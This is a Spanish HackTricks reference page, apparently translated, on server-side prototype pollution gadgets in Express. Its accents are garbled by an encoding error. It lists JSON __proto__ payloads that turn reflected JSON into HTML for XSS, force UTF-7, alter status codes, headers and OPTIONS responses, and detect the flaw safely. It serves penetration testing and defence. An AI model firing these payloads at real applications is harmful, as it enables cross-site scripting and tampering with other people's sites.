# Gadgets de Contaminaci√≥n de Prototipos en Express

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
## Servir respuestas XSS

### Cambiar el tipo de contenido JSON a HTML

En una aplicaci√≥n Express que utiliza una **respuesta de tipo de contenido JSON** y refleja un JSON:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
En estos casos, normalmente no es posible XSS con un tipo de contenido JSON. Sin embargo, con la contaminaci√≥n de prototipos podemos **confundir a Express para que sirva una respuesta HTML.** Esta vulnerabilidad depende de que la aplicaci√≥n utilice **`res.send(obj)`** y use el analizador de cuerpo con el tipo de contenido application/json.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
Al **contaminar** tanto las propiedades **`body`** como **`_body`**, es posible hacer que **Express sirva el tipo de contenido HTML** y refleje la propiedad `_body`, lo que resulta en XSS almacenado.

### Renderizar UTF7

Es posible hacer que express **renderice contenido UTF-7 con**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## T√©cnicas de Escaneo Seguras

### Espacios JSON

El siguiente PP har√° que los atributos dentro de un JSON tengan un espacio extra, lo cual no romper√° la funcionalidad:
```json
{"__proto__":{"json spaces": " "}}
```
Entonces un JSON reflejado se ver√° as√≠:
```json
{"foo":  "bar"} -- Note the extra space
```
### Encabezados Expuestos

El siguiente gadget de PP har√° que el servidor env√≠e de vuelta el encabezado HTTP: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
Requiere que el **m√≥dulo CORS est√© instalado**

### **M√©todo OPTIONS**

Con el siguiente payload, es posible **ocultar un m√©todo de una respuesta OPTIONS**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Estado**

Es posible cambiar el **c√≥digo de estado devuelto** utilizando la siguiente carga √∫til de PP:
```json
{"__proto__":{"status":510}}
```
### Error

Cuando asignas a un prototipo con un primitivo como una cadena, produce una **operaci√≥n no-op ya que el prototipo tiene que ser un objeto**. Si intentas asignar un objeto prototipo al `Object.prototype` en s√≠, esto **lanzar√° una excepci√≥n**. Podemos usar estos dos comportamientos para **detectar si la contaminaci√≥n de prototipos fue exitosa**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Valor Reflejado

Si la aplicaci√≥n est√° reflejando un objeto en la respuesta, podr√≠as simplemente crear un atributo con un **nombre extra√±o y el `__proto__`** y si **solo el nombre extra√±o se refleja**, es posible que la web sea vulnerable:
```json
{"hacktricks":"rocks","__proto__":"test"}
```
O si se utiliza una biblioteca similar a Lodash, puedes **establecer una propiedad a trav√©s de PP y dentro del objeto** y si esa propiedad no se refleja es porque Lodash examina el objeto actual para ver si la propiedad ya existe en el objeto fusionado:
```javascript
{"__proto__":{"a":"asd"},"a":"asd2","b":"dfg"}
// If only b is reflected then PP in Lodash
```
## Varios

### Permitir Puntos

Existe una opci√≥n en Express que te permite **crear objetos a partir de par√°metros de cadena de consulta**.\
Definitivamente podr√≠as usarla en una **cadena de bugs** para explotar una **vulnerabilidad de contaminaci√≥n de prototipos**.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` crea un objeto en Node.**

## Referencias

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
